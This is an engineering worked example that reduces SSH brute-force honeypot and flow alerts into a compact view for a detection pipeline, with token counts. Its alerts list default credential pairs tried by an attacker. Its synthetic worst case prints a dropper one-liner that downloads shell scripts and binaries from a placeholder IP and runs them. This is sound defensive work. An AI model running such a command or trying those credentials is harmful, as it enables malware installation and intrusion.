# Reduction policy v1.0: worked example

Ticket SCRUM-44 [E0-05]. This applies METHODS.md "Reduction policy v1.0" by hand to the E0-01 spike bundle (`spikes/bundle_ssh_bruteforce.json`). Section numbers written as §n refer to that METHODS.md section.

The spike bundle is in the E0-01 spike format, not alert-v0.1: its alerts are flat and carry `device_id` and an inline `anomaly_score`. The fields map one to one to alert-v0.1. `anomaly_score` is hand-written and stands in for the flow detector's score (C-15).

## Before: the spike bundle

13 alerts: 10 honeypot, 3 flows, no MQTT. Ground truth (`expected_verdict`) is removed before reduction and never reaches a condition.

```json
{
  "bundle_id": "spike-ssh-001",
  "window": {"start": "2026-09-14T10:15:00Z", "end": "2026-09-14T10:16:00Z"},
  "device_id": "hp-ssh-01",
  "sources": {
    "honeypot": {"status": "active", "alert_count": 10},
    "flows": {"status": "active", "alert_count": 3},
    "mqtt": {"status": "no_alerts", "alert_count": 0}
  },
  "alerts": [
    {"alert_id": "hp-0001", "source": "honeypot", "ts": "2026-09-14T10:15:04.112Z", "device_id": "hp-ssh-01",
     "event": "session_connect", "session_id": "s-7f3a", "src_ip": "203.0.113.45", "src_port": 51022, "dst_ip": "172.20.0.10", "dst_port": 22, "protocol": "ssh"},
    {"alert_id": "hp-0002", "source": "honeypot", "ts": "2026-09-14T10:15:04.390Z", "device_id": "hp-ssh-01",
     "event": "client_version", "session_id": "s-7f3a", "src_ip": "203.0.113.45", "client_version": "SSH-2.0-libssh_0.9.6"},
    {"alert_id": "hp-0003", "source": "honeypot", "ts": "2026-09-14T10:15:06.020Z", "device_id": "hp-ssh-01",
     "event": "login_failed", "session_id": "s-7f3a", "src_ip": "203.0.113.45", "username": "root", "password": "123456"},
    {"alert_id": "hp-0004", "source": "honeypot", "ts": "2026-09-14T10:15:08.551Z", "device_id": "hp-ssh-01",
     "event": "login_failed", "session_id": "s-7f3a", "src_ip": "203.0.113.45", "username": "root", "password": "admin"},
    {"alert_id": "fl-0001", "source": "flows", "ts": "2026-09-14T10:15:09.240Z", "device_id": "hp-ssh-01",
     "flow_start": "2026-09-14T10:15:04.101Z", "duration_s": 5.139, "src_ip": "203.0.113.45", "src_port": 51022, "dst_ip": "172.20.0.10", "dst_port": 22, "protocol": "tcp",
     "packets_fwd": 24, "packets_bwd": 22, "bytes_fwd": 3412, "bytes_bwd": 4870, "tcp_flags": "SYN,ACK,PSH,FIN", "anomaly_score": 0.91},
    {"alert_id": "hp-0005", "source": "honeypot", "ts": "2026-09-14T10:15:21.870Z", "device_id": "hp-ssh-01",
     "event": "session_connect", "session_id": "s-91c2", "src_ip": "203.0.113.45", "src_port": 51044, "dst_ip": "172.20.0.10", "dst_port": 22, "protocol": "ssh"},
    {"alert_id": "hp-0006", "source": "honeypot", "ts": "2026-09-14T10:15:23.904Z", "device_id": "hp-ssh-01",
     "event": "login_failed", "session_id": "s-91c2", "src_ip": "203.0.113.45", "username": "admin", "password": "admin"},
    {"alert_id": "hp-0007", "source": "honeypot", "ts": "2026-09-14T10:15:26.317Z", "device_id": "hp-ssh-01",
     "event": "login_failed", "session_id": "s-91c2", "src_ip": "203.0.113.45", "username": "pi", "password": "raspberry"},
    {"alert_id": "fl-0002", "source": "flows", "ts": "2026-09-14T10:15:27.002Z", "device_id": "hp-ssh-01",
     "flow_start": "2026-09-14T10:15:21.858Z", "duration_s": 5.144, "src_ip": "203.0.113.45", "src_port": 51044, "dst_ip": "172.20.0.10", "dst_port": 22, "protocol": "tcp",
     "packets_fwd": 23, "packets_bwd": 21, "bytes_fwd": 3388, "bytes_bwd": 4826, "tcp_flags": "SYN,ACK,PSH,FIN", "anomaly_score": 0.89},
    {"alert_id": "hp-0008", "source": "honeypot", "ts": "2026-09-14T10:15:40.215Z", "device_id": "hp-ssh-01",
     "event": "session_connect", "session_id": "s-b05e", "src_ip": "203.0.113.45", "src_port": 51068, "dst_ip": "172.20.0.10", "dst_port": 22, "protocol": "ssh"},
    {"alert_id": "hp-0009", "source": "honeypot", "ts": "2026-09-14T10:15:42.330Z", "device_id": "hp-ssh-01",
     "event": "login_failed", "session_id": "s-b05e", "src_ip": "203.0.113.45", "username": "ubuntu", "password": "ubuntu"},
    {"alert_id": "hp-0010", "source": "honeypot", "ts": "2026-09-14T10:15:44.768Z", "device_id": "hp-ssh-01",
     "event": "login_failed", "session_id": "s-b05e", "src_ip": "203.0.113.45", "username": "root", "password": "password"},
    {"alert_id": "fl-0003", "source": "flows", "ts": "2026-09-14T10:15:45.390Z", "device_id": "hp-ssh-01",
     "flow_start": "2026-09-14T10:15:40.203Z", "duration_s": 5.187, "src_ip": "203.0.113.45", "src_port": 51068, "dst_ip": "172.20.0.10", "dst_port": 22, "protocol": "tcp",
     "packets_fwd": 25, "packets_bwd": 22, "bytes_fwd": 3440, "bytes_bwd": 4902, "tcp_flags": "SYN,ACK,PSH,FIN", "anomaly_score": 0.93}
  ]
}
```

## Step by step

D = `hp-ssh-01`, `addr(D)` = {`172.20.0.10`}. Every flow has `dst_ip ∈ addr(D)`.

**Flows (§3)**

| Key | Working | Value |
|---|---|---|
| `count` | fl-0001, fl-0002, fl-0003 | 3 |
| `unique_dst_ips` | {172.20.0.10} | 1 |
| `unique_dst_ports` | {22} | 1 |
| `bytes_out` | D is the destination, so Σ `bytes_bwd` = 4870 + 4826 + 4902 | 14598 |
| `bytes_in` | Σ `bytes_fwd` = 3412 + 3388 + 3440 | 10240 |
| `protocol_mix` | all `tcp` | `{"tcp":3}` |
| `syn_only_ratio` | the spike format has no SYN or ACK counters. Derived by hand from `tcp_flags`: every flow contains ACK, so none is SYN-only; 0 of 3 TCP flows | 0.0 |
| `duration_s` | sorted 5.139, 5.144, 5.187 | min 5.139, median 5.144, max 5.187 |
| `detector` | highest `anomaly_score` 0.93; the spike has no detector label, so `label` is left out | `{"max_score":0.93}` |

**Flow exemplars (§4).** All 3 flows qualify (cap 5), ranked by score: fl-0003 (0.93), fl-0001 (0.91), fl-0002 (0.89). There are no ties. `t` is `ts` minus the window start: 45.390 → `45.39`, 9.240 → `9.24`, 27.002. Every flow is an exemplar, so `other_ids` is empty and left out (§5, §8).

**MQTT.** The state is `no_alerts`, so there is no block (§2).

**Honeypot (§3)**

| Key | Working | Value |
|---|---|---|
| `session_count` | `session_connect` in s-7f3a, s-91c2, s-b05e | 3 |
| `unique_src_ips` | {203.0.113.45} | 1 |
| `login_success` | none | 0 |
| `login_failed` | hp-0003, 0004, 0006, 0007, 0009, 0010 | 6 |
| `auth_attempts` | 6 + 0 | 6 |
| `detector` | the spike has no honeypot detector score or label | left out |

**Honeypot command sequences (§4, §6).** No session has a command line, so there are none. The cap (200 characters) and the delimiter (` ; `) are not exercised by this bundle. The synthetic worst case below exercises them.

**Honeypot `other_ids` (§5).** Event classes in order: command lines (none), `login_success` (none), `login_failed` (6), then others. The first 5 `login_failed` by `ts` are hp-0003, hp-0004, hp-0006, hp-0007 and hp-0009; hp-0010 is the sixth and is cut.

## After: the reduced view

Shown indented for reading:

```json
{
  "bundle_id": "spike-ssh-001",
  "window": ["2026-09-14T10:15:00Z", "2026-09-14T10:16:00Z"],
  "device": "hp-ssh-01",
  "sources": {"flows": "active", "mqtt": "no_alerts", "honeypot": "active"},
  "flows": {
    "count": 3,
    "unique_dst_ips": 1,
    "unique_dst_ports": 1,
    "bytes_out": 14598,
    "bytes_in": 10240,
    "protocol_mix": {"tcp": 3},
    "syn_only_ratio": 0.0,
    "duration_s": {"min": 5.139, "median": 5.144, "max": 5.187},
    "detector": {"max_score": 0.93},
    "exemplars": [
      {"id": "fl-0003", "t": 45.39, "src": "203.0.113.45:51068", "dst": "172.20.0.10:22", "proto": "tcp", "dur_s": 5.187,
       "bytes_fwd": 3440, "bytes_bwd": 4902, "pkts_fwd": 25, "pkts_bwd": 22, "flags": "SYN,ACK,PSH,FIN", "score": 0.93},
      {"id": "fl-0001", "t": 9.24, "src": "203.0.113.45:51022", "dst": "172.20.0.10:22", "proto": "tcp", "dur_s": 5.139,
       "bytes_fwd": 3412, "bytes_bwd": 4870, "pkts_fwd": 24, "pkts_bwd": 22, "flags": "SYN,ACK,PSH,FIN", "score": 0.91},
      {"id": "fl-0002", "t": 27.002, "src": "203.0.113.45:51044", "dst": "172.20.0.10:22", "proto": "tcp", "dur_s": 5.144,
       "bytes_fwd": 3388, "bytes_bwd": 4826, "pkts_fwd": 23, "pkts_bwd": 21, "flags": "SYN,ACK,PSH,FIN", "score": 0.89}
    ]
  },
  "honeypot": {
    "session_count": 3,
    "unique_src_ips": 1,
    "auth_attempts": 6,
    "login_success": 0,
    "login_failed": 6,
    "other_ids": ["hp-0003", "hp-0004", "hp-0006", "hp-0007", "hp-0009"]
  }
}
```

Exactly as serialized for a condition (§8), one line:

```
{"bundle_id":"spike-ssh-001","window":["2026-09-14T10:15:00Z","2026-09-14T10:16:00Z"],"device":"hp-ssh-01","sources":{"flows":"active","mqtt":"no_alerts","honeypot":"active"},"flows":{"count":3,"unique_dst_ips":1,"unique_dst_ports":1,"bytes_out":14598,"bytes_in":10240,"protocol_mix":{"tcp":3},"syn_only_ratio":0.0,"duration_s":{"min":5.139,"median":5.144,"max":5.187},"detector":{"max_score":0.93},"exemplars":[{"id":"fl-0003","t":45.39,"src":"203.0.113.45:51068","dst":"172.20.0.10:22","proto":"tcp","dur_s":5.187,"bytes_fwd":3440,"bytes_bwd":4902,"pkts_fwd":25,"pkts_bwd":22,"flags":"SYN,ACK,PSH,FIN","score":0.93},{"id":"fl-0001","t":9.24,"src":"203.0.113.45:51022","dst":"172.20.0.10:22","proto":"tcp","dur_s":5.139,"bytes_fwd":3412,"bytes_bwd":4870,"pkts_fwd":24,"pkts_bwd":22,"flags":"SYN,ACK,PSH,FIN","score":0.91},{"id":"fl-0002","t":27.002,"src":"203.0.113.45:51044","dst":"172.20.0.10:22","proto":"tcp","dur_s":5.144,"bytes_fwd":3388,"bytes_bwd":4826,"pkts_fwd":23,"pkts_bwd":21,"flags":"SYN,ACK,PSH,FIN","score":0.89}]},"honeypot":{"session_count":3,"unique_src_ips":1,"auth_attempts":6,"login_success":0,"login_failed":6,"other_ids":["hp-0003","hp-0004","hp-0006","hp-0007","hp-0009"]}}
```

What the reduction drops from this bundle: the usernames and passwords tried, the SSH client version, `hp-0001`/`0002`/`0005`/`0008`/`0010` as citable IDs, and the per-alert timestamps of the honeypot events. What it keeps: every count, the attacker address and the three session ports, through the flow exemplars, which tie each flow to a honeypot session; and citable IDs from both active sources.

## Token counts

Tokenizer: Llama 3 (vocabulary 128,256), from the local development model `llama3.1-8b-8k` (Llama 3.1 8B Q4_K_M, Ollama digest 6811dcd559d9). Counts first came from Ollama 0.23.2 (`prompt_eval_count` of a raw call, minus 1 BOS token, model unloaded between calls, each text counted twice). They were then checked against the same tokenizer loaded directly from the model file: the counts were identical on all six texts measured with Ollama. The counting scripts are throwaway and not committed.

| Text | Characters | Tokens |
|---|---|---|
| Spike bundle without ground truth, compact JSON (the ratio's numerator, §10) | 3,568 | **1,351** |
| Spike bundle exactly as the spike sent it (`json.dumps(indent=1)`) | 4,457 | 1,892 |
| Reduced view, compact JSON (above) | 1,199 | **486** |

**Reduction ratio: 1,351 ÷ 486 = 2.78.** Against the spike's indented text: 1,892 ÷ 486 = 3.89 (reference only).

Cross-check: the spike logged 2,116 prompt tokens per call (FINDINGS.md). 1,892 of those are the bundle, so its system prompt and chat template were about 224 tokens.

## Synthetic worst case

This is a view with every cap full, built from placeholder values (documentation IP ranges, invented counts). It is not built from pilot or evaluation data. It contains 3 active sources, 5 flow exemplars, 3 MQTT exemplars, 3 command sequences cut at 200 characters, and 5 `other_ids` per source.

The command text is a dropper-style one-liner of 275 characters. After the cut and the marker it reads:

```
cd /tmp || cd /var/run; wget http://198.51.100.7/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 198.51.100.7 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox wget http://198.51.100.7/x86; chmod…[+75 chars]
```

| Variant | Tokens |
|---|---|
| Worst case, cap 128 | 1,240 |
| **Worst case, cap 200 (frozen)** | **1,324** |
| Worst case, cap 256 | 1,399 |
| One command sequence at cap 200 | 87 |
| Action catalog v0.1, IDs and descriptions only (8 actions) | 166 |
| Action catalog v0.1, whole YAML file | 2,914 |

The view is bounded at about 1,324 tokens, while a raw bundle grows by about 104 tokens per alert (1,351 ÷ 13). The ratio on busy windows is therefore much higher than 2.78 (§10).

All three worst-case rows include the session port in honeypot `src`.
